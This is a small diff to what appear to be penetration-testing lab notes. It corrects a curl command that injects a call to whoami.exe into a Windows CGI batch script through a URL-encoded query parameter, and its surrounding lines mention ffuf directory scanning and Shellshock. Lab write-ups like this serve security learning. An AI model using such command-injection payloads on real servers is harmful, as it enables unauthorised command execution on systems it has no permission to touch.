@@ -302,7 +302,7 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 
 Running whoami on a discover bat file:
 ```
-curl 'http://10.129.205.30:8080/cgi/welcome.bat?&http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
+curl 'http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
 ```
 
 In case the CGI script is a bash script it can be vunerable to shell shock in case of an old bash version...
